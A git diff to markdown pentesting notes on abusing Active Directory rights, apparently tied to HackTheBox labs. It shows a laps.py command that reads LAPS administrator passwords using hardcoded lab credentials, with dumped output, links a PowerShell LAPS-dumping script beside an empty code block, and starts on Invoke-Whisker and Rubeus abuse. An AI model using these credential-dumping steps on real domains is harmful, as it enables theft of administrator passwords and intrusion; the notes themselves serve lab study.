@@ -10,14 +10,21 @@ show_image_post: false                                    # Change this to true
 ---
 
 ### ReadLAPSPassword
-We can use the utility laps.py to read LAPS passwords:
+We can use the utility laps.py to read LAPS passwords outside the machine, all we need is valid credentials:
 ```bash
 python3 laps.py -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb
 LAPS Dumper - Running at 07-07-2022 13:57:05
 DC &V@%DQ-wEwQ97A
 ```
+Examples:
 [Timelapse](https://shuciran.github.io/posts/Timelapse/#fnref:readlapspassword)
 [[StreamIO#^2cc182]]
+
+Also another technique is with [Get-LAPSPasswords.ps1](https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1) which can be abused within the machine:
+```powershell
+```
+Examples:
+[Timelapse](https://shuciran.github.io/posts/Timelapse/#fnref:Get-LAPSPasswords)
 
 ### AddKeyCredentialLink
 We can use `Invoke-Whisker.ps1` to abuse this privilege, first we need to execute the following command after upload it to the victim machine. This will retrieve a huge command that can be used with [Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries):
